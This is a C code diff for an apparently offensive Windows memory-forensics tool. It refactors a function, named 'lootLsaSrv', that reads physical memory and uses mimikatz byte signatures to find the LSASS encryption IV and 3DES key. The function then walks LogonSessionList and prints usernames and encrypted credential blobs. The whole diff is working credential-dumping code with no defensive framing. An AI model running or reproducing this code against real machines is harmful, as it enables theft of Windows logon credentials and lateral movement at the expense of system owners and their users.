@@ -174,7 +174,182 @@ ULONGLONG readPhysMemPointer(LARGE_INTEGER offset) {
     return buffer;
 }
 
+void lootLsaSrv(ULONGLONG start, ULONGLONG end, ULONGLONG size) {
+    LARGE_INTEGER reader;
+    DWORD bytes_read = 0;
+    LPSTR lsasrv = NULL;
+    ULONGLONG cursor = 0;
+    ULONGLONG lsasrv_size = 0;
+    ULONGLONG original = 0;
+    BOOL result; 
+ 
+
+    ULONGLONG LogonSessionListCount = 0;
+    ULONGLONG LogonSessionList = 0;
+    ULONGLONG LogonSessionList_offset = 0;
+    ULONGLONG LogonSessionListCount_offset = 0;
+    ULONGLONG iv_offset = 0;
+    ULONGLONG hDes_offset = 0;
+    ULONGLONG DES_pointer = 0;
+
+    unsigned char* iv_vector = NULL;
+    unsigned char* DES_key = NULL;
+    KIWI_BCRYPT_HANDLE_KEY h3DesKey;
+    KIWI_BCRYPT_KEY81 extracted3DesKey;
+
+    LSAINITIALIZE_NEEDLE LsaInitialize_needle = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
+    LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
+    
+    PBYTE LsaInitialize_needle_buffer = NULL;
+    PBYTE needle_buffer = NULL;
+
+    int offset_LsaInitialize_needle = 0;
+    int offset_LogonSessionList_needle = 0;
+
+    ULONGLONG currentElem = 0;
+
+    original = start;
+
+    /* Save the whole region in a buffer */
+    lsasrv = (LPSTR)malloc(size);
+    while (start < end) {
+        DWORD bytes_read = 0;
+        DWORD bytes_written = 0;
+        CHAR tmp = NULL;
+        reader.QuadPart = v2p(start);
+        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+        result = ReadFile(pmem_fd, &tmp, 1, &bytes_read, NULL);
+        lsasrv[cursor] = tmp;
+        cursor++;
+        start = original + cursor;
+    }
+    lsasrv_size = cursor;
+
+    // Use mimikatz signatures to find the IV/keys
+    printf("\t\t===================[Crypto info]===================\n");   
+    LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
+    memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
+    offset_LsaInitialize_needle = memmem((PBYTE)lsasrv, lsasrv_size, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));
+    printf("[*] Offset for InitializationVector/h3DesKey/hAesKey is %d\n", offset_LsaInitialize_needle);
+
+    memcpy(&iv_offset, lsasrv + offset_LsaInitialize_needle + 0x43, 4);  //IV offset
+    printf("[*] IV Vector relative offset: 0x%08llx\n", iv_offset);
+    iv_vector = (unsigned char*)malloc(16);
+    memcpy(iv_vector, lsasrv + offset_LsaInitialize_needle + 0x43 + 4 + iv_offset, 16);
+    printf("\t\t[/!\\] IV Vector: ");
+    for (int i = 0; i < 16; i++) {
+        printf("%02x", iv_vector[i]);
+    }
+    printf(" [/!\\]\n");
+    free(iv_vector);
+
+    memcpy(&hDes_offset, lsasrv + offset_LsaInitialize_needle - 0x59, 4); //DES KEY offset
+    printf("[*] 3DES Handle Key relative offset: 0x%08llx\n", hDes_offset);  
+    reader.QuadPart = v2p(original + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset);
+    DES_pointer = readPhysMemPointer(reader);
+    printf("[*] 3DES Handle Key pointer: 0x%08llx\n", DES_pointer);
+
+    reader.QuadPart = v2p(DES_pointer);
+    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+    result = ReadFile(pmem_fd, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), &bytes_read, NULL);
+    reader.QuadPart = v2p((ULONGLONG)h3DesKey.key);
+    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+    result = ReadFile(pmem_fd, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81), &bytes_read, NULL);
+
+    DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
+    memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
+    printf("\t\t[/!\\] 3DES Key: ");
+    for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
+        printf("%02x", DES_key[i]);
+    }
+    printf(" [/!\\]\n");
+    free(DES_key);
+    printf("\t\t================================================\n");
+
+    needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
+    memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
+    offset_LogonSessionList_needle = memmem((PBYTE)lsasrv, lsasrv_size, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));
+
+    memcpy(&LogonSessionList_offset, lsasrv + offset_LogonSessionList_needle + 0x17, 4);
+    printf("[*] LogonSessionList Relative Offset: 0x%08llx\n", LogonSessionList_offset);
+
+    LogonSessionList = original + offset_LogonSessionList_needle + 0x17 + 4 + LogonSessionList_offset;
+    printf("[*] LogonSessionList: 0x%08llx\n", LogonSessionList);
+
+    reader.QuadPart = v2p(LogonSessionList);
+    printf("\t\t===================[LogonSessionList]===================");
+    while (currentElem != LogonSessionList) {
+        if (currentElem == 0) {
+            currentElem = LogonSessionList;
+        }
+        reader.QuadPart = v2p(currentElem);
+        currentElem = readPhysMemPointer(reader);
+        //printf("Element at: 0x%08llx\n", currentElem);
+        USHORT length = 0;
+        LPWSTR username = NULL;
+        ULONGLONG username_pointer = 0;
+
+        reader.QuadPart = v2p(currentElem + 0x90);  //UNICODE_STRING = USHORT LENGHT USHORT MAXLENGTH LPWSTR BUFFER
+        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+        result = ReadFile(pmem_fd, &length, 2, &bytes_read, NULL); //Read Lenght Field
+        username = (LPWSTR)malloc(length + 2);
+        memset(username, 0, length + 2);
+        reader.QuadPart = v2p(currentElem + 0x98);
+        username_pointer = readPhysMemPointer(reader); //Read LPWSTR
+        reader.QuadPart = v2p(username_pointer);
+        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+        result = ReadFile(pmem_fd, username, length, &bytes_read, NULL); //Read string at LPWSTR
+        wprintf(L"\n[+] Username: %s \n", username);
+        free(username);
+
+        ULONGLONG credentials_pointer = 0;
+        reader.QuadPart = v2p(currentElem + 0x108);
+        credentials_pointer = readPhysMemPointer(reader);
+        if (credentials_pointer == 0) {
+            printf("[+] Cryptoblob: (empty)\n");
+            continue;
+        }
+        printf("[*] Credentials Pointer: 0x%08llx\n", credentials_pointer);
+
+        ULONGLONG primaryCredentials_pointer = 0;
+        reader.QuadPart = v2p(credentials_pointer + 0x10);
+        primaryCredentials_pointer = readPhysMemPointer(reader);
+        printf("[*] Primary credentials Pointer: 0x%08llx\n", primaryCredentials_pointer);
+
+        USHORT cryptoblob_size = 0;
+        reader.QuadPart = v2p(primaryCredentials_pointer + 0x18);
+        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+        result = ReadFile(pmem_fd, &cryptoblob_size, 4, &bytes_read, NULL);
+        if (cryptoblob_size % 8 != 0) {
+            printf("[*] Cryptoblob size: (not compatible with 3DEs, skipping...)\n");
+            continue;
+        }
+        printf("[*] Cryptoblob size: 0x%x\n", cryptoblob_size);
+
+        ULONGLONG cryptoblob_pointer = 0;
+        reader.QuadPart = v2p(primaryCredentials_pointer + 0x20);
+        cryptoblob_pointer = readPhysMemPointer(reader);
+        //printf("Cryptoblob pointer: 0x%08llx\n", cryptoblob_pointer);
+
+        unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
+        reader.QuadPart = v2p(cryptoblob_pointer);
+        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
+        result = ReadFile(pmem_fd, cryptoblob, cryptoblob_size, &bytes_read, NULL);
+        printf("[+] Cryptoblob:\n");
+        for (int i = 0; i < cryptoblob_size; i++) {
+            printf("%02x", cryptoblob[i]);
+        }
+        printf("\n");
+    }
+    printf("\t\t================================================\n");
+    free(needle_buffer);
+    free(lsasrv);
+}
+
+
 void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
+
+    /* Variables used to walk the AVL tree*/
     ULONGLONG* queue;
     BOOL result;
     DWORD bytes_read = 0;
@@ -193,6 +368,7 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
     VAD* vadList = NULL;
 
 
+    //Quitar
     ULONGLONG LogonSessionListCount = 0;
     ULONGLONG LogonSessionList = 0;
     ULONGLONG LogonSessionList_offset = 0;
@@ -200,13 +376,13 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
     ULONGLONG iv_offset = 0;
     ULONGLONG hDes_offset = 0;
     ULONGLONG hAES_offset = 0;
-
+    
 
     printf("[+] Starting to walk _RTL_AVL_TREE...\n");
-    queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4);
+    queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4); // Make room for our queue
     queue[0] = VadRoot; // Node 0
 
-    vadList = (VAD*)malloc(VadCount * sizeof(*vadList));
+    vadList = (VAD*)malloc(VadCount * sizeof(*vadList)); // Save all the VADs in an array. We do not really need it (because we can just break when the lsasrv.dll is found) but hey... maybe we want to reuse this code in the future
 
     while (count <= VadCount) {
         ULONGLONG currentNode;
@@ -304,11 +480,8 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
         printf("[!] Path name: %S\n", path);
         */
 
-        // Print the info
-        //printf("[*] Node number (%lld) (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", count, currentNode, start, end, end - start);
 
-
-        // Save the info
+        // Save the info in our list
         vadList[count - 1].id = count - 1;
         vadList[count - 1].vaddress = currentNode;
         vadList[count - 1].start = start;
@@ -323,6 +496,8 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
         count++;
         cursor++;
     }
+
+    //Just print the VAD list
     printf("\t\t===================[VAD info]===================\n");
     for (int i = 0; i < VadCount; i++) {
         printf("[%lld] (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].id, vadList[i].vaddress, vadList[i].start, vadList[i].end, vadList[i].size);
@@ -332,188 +507,17 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
     }
     printf("\t\t================================================\n");
 
-    // LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
+
     for (int i = 0; i < VadCount; i++) {
-        if (!strcmp(vadList[i].image, "\\Windows\\System32\\lsasrv.dll")) {
-            ULONGLONG start = 0;
-            ULONGLONG end = 0;
-            LARGE_INTEGER large_start;
-            start = vadList[i].start;
-            end = vadList[i].end;
+        if (!strcmp(vadList[i].image, "\\Windows\\System32\\lsasrv.dll")) { // Is this our target?
             printf("[!] LsaSrv.dll found! [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].start, vadList[i].end, vadList[i].size);
-            char *lsasrv = NULL;
-            ULONGLONG j = 0;
-
-            lsasrv = (char*)malloc(vadList[i].size);
-
-            while (start < end) {
-                DWORD bytes_read = 0;
-                DWORD bytes_written = 0;
-                CHAR tmp = NULL;
-                large_start.QuadPart = v2p(start);
-                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-                result = ReadFile(pmem_fd, &tmp, 1, &bytes_read, NULL);
-                lsasrv[j] = tmp;
-                j++;
-                start = vadList[i].start + j;
-            }
-
-
-
-
-            LSAINITIALIZE_NEEDLE LsaInitialize_needle= { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
-            PBYTE LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
-            memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
-            int offset_LsaInitialize_needle = 0;
-            offset_LsaInitialize_needle = memmem((PBYTE)lsasrv, j, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));
-            printf("Offset for InitializationVector/h3DesKey/hAesKey is %d\n", offset_LsaInitialize_needle);
-
-
-            memcpy(&iv_offset, lsasrv + offset_LsaInitialize_needle + 0x43, 4);  //IV offset
-            printf("IV Vector relative offset: 0x%08llx\n", iv_offset);
-            unsigned char* iv_vector = (unsigned char*)malloc(16);
-            memcpy(iv_vector, lsasrv + offset_LsaInitialize_needle + 0x43 + 4 +  iv_offset, 16);
-            printf("IV Vector: ");
-            for (int i = 0; i < 16; i++) {
-                printf("%02x", iv_vector[i]);
-            }
-            printf("\n");
-
-
-            memcpy(&hDes_offset, lsasrv + offset_LsaInitialize_needle - 0x59, 4); //DES KEY offset
-            printf("3DES Key relative offset: 0x%08llx\n", hDes_offset);
-            ULONGLONG des_pointer = 0;
-            large_start.QuadPart = v2p(vadList[i].start + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset);
-            des_pointer = readPhysMemPointer(large_start);
-            printf("3DES Key pointer: 0x%08llx\n", des_pointer);
-
-            KIWI_BCRYPT_HANDLE_KEY h3DesKey;
-            KIWI_BCRYPT_KEY81 extracted3DesKey;
-
-            large_start.QuadPart = v2p(des_pointer);
-            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-            result = ReadFile(pmem_fd, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), &bytes_read, NULL); 
-            large_start.QuadPart = v2p((ULONGLONG)h3DesKey.key);
-            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-            result = ReadFile(pmem_fd, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81), &bytes_read, NULL);
-            unsigned char* DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
-            memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
-            printf("3DES Key: ");
-            for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
-                printf("%02x", DES_key[i]);
-            }
-            printf("\n");
-
-
-
-
-
-
-
-
-
-
-
-
-            LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
-            PBYTE needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
-            memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
-            int offset = 0;
-            offset = memmem((PBYTE)lsasrv, j, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));
-
-
-            memcpy(&LogonSessionList_offset, lsasrv + offset + 0x17, 4);
-            printf("LogonSessionList Relative Offset: 0x%08llx\n", LogonSessionList_offset);
-
-            LogonSessionList = vadList[i].start + offset + 0x17 + 4 + LogonSessionList_offset;
-            printf("LogonSessionList: 0x%08llx\n", LogonSessionList);
-            large_start.QuadPart = v2p(LogonSessionList);
-            ULONGLONG currentElem = 0;
-            while (currentElem != LogonSessionList) {
-                if (currentElem == 0) {
-                    currentElem = LogonSessionList;
-                }
-                large_start.QuadPart = v2p(currentElem);
-                currentElem = readPhysMemPointer(large_start);
-                //printf("Element at: 0x%08llx\n", currentElem);
-                USHORT length = 0;
-                LPWSTR username = NULL;
-                ULONGLONG username_pointer = 0;
-
-                large_start.QuadPart = v2p(currentElem + 0x90);  //UNICODE_STRING = USHORT LENGHT USHORT MAXLENGTH LPWSTR BUFFER
-                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-                result = ReadFile(pmem_fd, &length, 2, &bytes_read, NULL); //Read Lenght Field
-                username = (LPWSTR)malloc(length + 2);
-                memset(username, 0, length + 2);
-                large_start.QuadPart = v2p(currentElem + 0x98); 
-                username_pointer = readPhysMemPointer(large_start); //Read LPWSTR
-                large_start.QuadPart = v2p(username_pointer);
-                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-                result = ReadFile(pmem_fd, username, length, &bytes_read, NULL); //Read string at LPWSTR
-                wprintf(L"Username: %s \n", username);
-                free(username);
-                
-                ULONGLONG credentials_pointer = 0;
-                large_start.QuadPart = v2p(currentElem + 0x108);
-                credentials_pointer = readPhysMemPointer(large_start);
-                printf("Credentials Pointer: 0x%08llx\n", credentials_pointer);
-
-                ULONGLONG primaryCredentials_pointer = 0;
-                large_start.QuadPart = v2p(credentials_pointer + 0x10);
-                primaryCredentials_pointer = readPhysMemPointer(large_start);
-                printf("Primary credentials Pointer: 0x%08llx\n", primaryCredentials_pointer);
-
-                USHORT cryptoblob_size = 0;
-                large_start.QuadPart = v2p(primaryCredentials_pointer + 0x18);
-                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-                result = ReadFile(pmem_fd, &cryptoblob_size, 4, &bytes_read, NULL); 
-                printf("Cryptoblob size: 0x%x\n", cryptoblob_size);
-                
-                ULONGLONG cryptoblob_pointer = 0;
-                large_start.QuadPart = v2p(primaryCredentials_pointer + 0x20);
-                cryptoblob_pointer = readPhysMemPointer(large_start);
-                printf("Cryptoblob pointer: 0x%08llx\n", cryptoblob_pointer);
-
-                unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
-                large_start.QuadPart = v2p(cryptoblob_pointer);
-                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
-                result = ReadFile(pmem_fd, cryptoblob, cryptoblob_size, &bytes_read, NULL); 
-                printf("Cryptoblob:\n");
-                for (int i = 0; i < cryptoblob_size; i++) {
-                    printf("%02x", cryptoblob[i]);
-                }
-                printf("\n");
-
-               /* BCRYPT_ALG_HANDLE  hDesProvider;
-                BCRYPT_KEY_HANDLE  hDes;
-                ULONG result;
-                NTSTATUS status;
-
-                BCryptCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
-                BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-                BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, DES_key, 16, 0);
-                status = BCryptDecrypt(hDes, (PUCHAR)cryptoblob, cryptoblob_size, 0, iv_vector, 8, decryptedPass, decryptedPassLen, &result, 0);
-
-                */
-            }
-
-            
-
-
-
-
-            memcpy(&LogonSessionListCount_offset, lsasrv + offset - 4, 4);
-            printf("LogonSessionListCount Relative Offset: 0x%08llx\n", LogonSessionListCount_offset);
-            LogonSessionListCount = vadList[i].start + offset + LogonSessionListCount_offset;
-            printf("LogonSessionListCount at: 0x%08llx\n", LogonSessionListCount);
-            large_start.QuadPart = v2p(LogonSessionListCount);
-            printf("LogonSessionListCount value is %lld\n", readPhysMemPointer(large_start));
+            lootLsaSrv(vadList[i].start, vadList[i].end, vadList[i].size);
             break;
         }
     }
     
 
-
+    
     free(vadList);
     free(queue);
     return;
